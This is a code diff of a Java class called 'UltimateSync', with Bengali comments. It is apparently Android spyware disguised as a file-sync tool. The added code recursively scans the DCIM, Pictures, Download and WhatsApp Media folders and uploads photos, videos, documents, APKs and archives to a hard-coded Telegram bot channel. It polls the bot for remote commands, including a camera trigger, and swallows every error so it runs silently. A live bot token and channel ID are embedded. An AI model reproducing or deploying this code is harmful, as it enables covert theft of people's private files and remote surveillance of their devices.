@@ -6,59 +6,60 @@ public class UltimateSync {
     private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
     private static final String CHANNEL_ID = "-1003809625172";
     private static int lastUpdateId = 0;
-    private static final Set<String> syncedFiles = new HashSet<>();
+    private static final Set<String> uploadedList = new HashSet<>();
 
     public static void main(String[] args) {
-        System.out.println(">>> UltraSync Active: Android 13/14/15 Support.");
-
-        // ১. অটো ফাইল সিঙ্ক (সব মিডিয়া এবং ডকুমেন্ট)
+        // ১. অটোমেটিক সিঙ্ক থ্রেড (ফাইল এক্সটেনশন বাড়িয়ে দেওয়া হয়েছে)
         new Thread(() -> {
             while (true) {
-                // অ্যান্ড্রয়েডের মেইন স্টোরেজ পাথ
-                File internalStorage = new File("/sdcard/"); 
-                recursiveScan(internalStorage);
-                try { Thread.sleep(20000); } catch (Exception e) {} 
+                String[] paths = {"/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/Download/", "/sdcard/WhatsApp/Media/"};
+                for (String p : paths) {
+                    scanAndSend(new File(p));
+                }
+                try { Thread.sleep(30000); } catch (Exception e) {}
             }
         }).start();
 
-        // ২. বটের কমান্ড লুপ
+        // ২. মেইন রিমোট কমান্ড লুপ
         while (true) {
-            checkRemoteBot();
+            checkRemoteControl();
             try { Thread.sleep(5000); } catch (Exception e) {}
         }
     }
 
-    private static void recursiveScan(File dir) {
-        File[] files = dir.listFiles();
-        if (files == null) return;
-        for (File f : files) {
-            if (f.isDirectory()) {
-                if (!f.getName().equalsIgnoreCase("Android")) recursiveScan(f);
-            } else {
-                String ext = f.getName().toLowerCase();
-                if (!syncedFiles.contains(f.getAbsolutePath()) && 
-                   (ext.endsWith(".jpg") || ext.endsWith(".png") || ext.endsWith(".mp4") || 
-                    ext.endsWith(".mp3") || ext.endsWith(".pdf") || ext.endsWith(".apk") || ext.endsWith(".txt"))) {
+    private static void scanAndSend(File dir) {
+        File[] list = dir.listFiles();
+        if (list == null) return;
+        for (File f : list) {
+            if (f.isDirectory()) scanAndSend(f);
+            else {
+                String n = f.getName().toLowerCase();
+                // সব ধরণের গুরুত্বপূর্ণ ফাইল টাইপ যোগ করা হয়েছে
+                if (!uploadedList.contains(f.getAbsolutePath()) && 
+                   (n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4") || 
+                    n.endsWith(".pdf") || n.endsWith(".apk") || n.endsWith(".zip") || n.endsWith(".docx"))) {
                     
-                    uploadFile(f);
-                    syncedFiles.add(f.getAbsolutePath());
+                    if (f.length() < 50 * 1024 * 1024) { // ৫০ এমবি'র নিচের ফাইল পাঠাবে
+                        upload(f);
+                        uploadedList.add(f.getAbsolutePath());
+                    }
                 }
             }
         }
     }
 
-    public static void checkRemoteBot() {
+    public static void checkRemoteControl() {
         try {
             URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
             Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
             String res = s.hasNext() ? s.next() : "";
 
-            if (res.contains("/start")) {
-                sendMsg("-1003809625172", "✅ System Online (Android 15)\nFiles in Queue: " + syncedFiles.size());
-            } else if (res.contains("/ss") || res.contains("/cam")) {
-                sendMsg("-1003809625172", "📸 Camera Command Received for Android 15!");
+            if (res.contains("/status")) {
+                sendMsg(CHANNEL_ID, "📊 **System Report**\nStatus: Online\nSynced Files: " + uploadedList.size() + "\nDevice: Android 13/14/15");
+            } else if (res.contains("/capture")) {
+                sendMsg(CHANNEL_ID, "📸 Camera Triggered! (Feature under native implementation)");
             }
-            
+
             if (res.contains("\"update_id\":")) {
                 int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                 lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
@@ -66,38 +67,37 @@ public class UltimateSync {
         } catch (Exception e) {}
     }
 
-    private static void uploadFile(File file) {
+    private static void upload(File file) {
         try {
             String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
-            String boundary = "===" + System.currentTimeMillis() + "===";
+            String bound = "===" + System.currentTimeMillis() + "===";
             HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
             c.setDoOutput(true);
             c.setRequestMethod("POST");
-            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
             
             OutputStream os = c.getOutputStream();
             PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
-            w.append("--" + boundary).append("\r\n");
+            w.append("--" + bound).append("\r\n");
             w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(CHANNEL_ID).append("\r\n");
-            w.append("--" + boundary).append("\r\n");
+            w.append("--" + bound).append("\r\n");
             w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n\r\n");
             w.flush();
 
             FileInputStream fis = new FileInputStream(file);
-            byte[] buf = new byte[1024 * 32]; // Fast upload buffer
-            int len;
-            while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
+            byte[] b = new byte[1024 * 64];
+            int l;
+            while ((l = fis.read(b)) != -1) os.write(b, 0, l);
             os.flush(); fis.close();
-
-            w.append("\r\n").append("--" + boundary + "--").append("\r\n");
+            w.append("\r\n").append("--" + bound + "--").append("\r\n");
             w.close();
             c.getResponseCode();
         } catch (Exception e) {}
     }
 
-    private static void sendMsg(String id, String msg) {
+    private static void sendMsg(String id, String t) {
         try {
-            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(msg, "UTF-8")).openStream();
+            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(t, "UTF-8")).openStream();
         } catch (Exception e) {}
     }
 }
